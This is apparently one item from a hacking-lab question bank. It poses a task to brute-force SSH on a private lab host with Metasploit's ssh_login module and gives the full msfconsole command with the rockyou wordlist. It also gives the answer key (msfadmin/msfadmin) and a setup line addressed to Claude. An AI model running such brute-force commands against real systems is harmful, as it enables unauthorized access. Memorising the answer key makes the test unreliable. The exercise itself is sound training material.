# Q288 — Metasploit SSH Login Scanner

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `msfconsole` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use Metasploit auxiliary/scanner/ssh/ssh_login module to brute force SSH."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>; module=<name>
```

---

## ✅ Solution

```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.52.129; set USERNAME msfadmin; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run"
```

**Answer:** `user=msfadmin; password=msfadmin; module=ssh_login`

---

## 🤖 Claude Setup Prompt

Ensure SSH on target and Metasploit DB initialized. Report back: "Lab ready for Q288"
